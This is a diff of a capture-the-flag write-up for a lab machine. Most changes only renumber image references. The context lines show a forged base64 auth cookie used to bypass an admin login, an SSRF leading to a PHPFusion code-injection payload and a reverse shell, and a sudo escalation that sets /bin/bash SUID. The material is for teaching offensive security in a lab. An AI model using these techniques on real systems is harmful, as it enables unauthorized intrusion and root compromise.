@@ -43,21 +43,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 There's an administration directory present, and when viewed it just shows a login page:
 
-<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
 
 I tried default and weak credentials, but they don't work. When the traffic is viewed in Burp, we can see that there are some tokens being passed around:
 
-<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
 
 The `auth_status` cookie is just a `base64` encoded string of `{'success':'false'}`. Afterwards, the `auth_status` cookie is appended to every subsequent login attempt. We can easily replace this with `true` and be granted access to the admin dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
 
 ### SSRF --> RCE
 
 Within the website, there isn't much functionality, but there is a 'Check Server Status' function:
 
-<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>
 
 Here's the HTTP request sent:
 
@@ -83,7 +83,7 @@ url=http%3A%2F%2F127.0.0.1%3A8080
 
 This looks vulnerable to a SSRF, and we can confirm it is.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
 
 Also, it tells us that the backend server is running PHPFusion. There are a few exploits available for PHPFusion:
 
@@ -134,7 +134,7 @@ url=http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=$\{system(bas
 
 Then we can get a reverse shell and grab the user flag:
 
-<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -202,7 +202,7 @@ function getDbInstance() {
 
 We can then `su` to `james`:
 
-<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
 
 ### Sudo Privileges
 
@@ -238,8 +238,8 @@ The exploit would be to write a small snippet making `/bin/bash` an SUID binary 
 
 We can use `vi` to edit the file to include `system("chmod u+s /bin/bash");`, and then use `:wq!` to force the save. Afterwards, when we can run the file using `sudo` as `james`:
 
-<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
 
 Then we can easily become the `root` user:
 
-<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
